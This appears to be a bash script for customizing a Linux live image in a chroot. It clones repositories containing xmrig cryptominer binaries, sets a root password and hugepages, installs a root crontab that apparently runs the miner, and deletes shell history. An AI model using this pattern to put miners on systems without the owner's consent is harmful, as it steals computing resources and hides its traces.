#!/bin/bash

echo "Checking dns/Ping before mounting proc/ sys/  dev/pts ..."
ping -c 1 www.google.com

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devpts none /dev/pts

echo "----CUSTOMIZATION STARTS----"

echo "silent apt update"
sudo apt-get update > /dev/null
echo "silent install of git vim curl"
sudo apt-get install git vim curl -y  > /dev/null

echo "Downloading some application (in this case, a mining program)"

git clone https://github.com/nuriyevn/r12  /r12
git clone https://github.com/nuriyevn/r16  /r16
chmod +x /r12/xmrig
chmod +x /r16/xmrig

echo "Let's change root password:"
passwd root

echo "Setting HUGESPAGES"
#sudo sysctl -w vm.nr_hugepages=1500
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"

echo "Installing crontab to which will invoke script which will execute application"
#sudo cp /per_minute /etc/cron.d/per_minute
sudo crontab /per_minute


#echo "Fixing of permissions for SUDO and CRONTAB just in case if they are messed"
#chown root:root /usr/bin/sudo && chmod 4755 /usr/bin/sudo
#pkexec chown root:root /etc/sudoers /etc/sudoers.d -R
#chown root:root /etc/crontab
#chown root:root /var/spool/cron/crontabs/root

echo "----CLEANING UP AND UNMOUNTING----"
apt clean
rm -rf /tmp/* ~/.bash_history

echo "unmounting /proc /sys /dev/pts"

umount /proc || umount -lf /proc
umount /sys
umount /dev/pts
exit

echo "unmounting  edit/dev edit/run"
sudo umount edit/dev
sudo umount edit/run


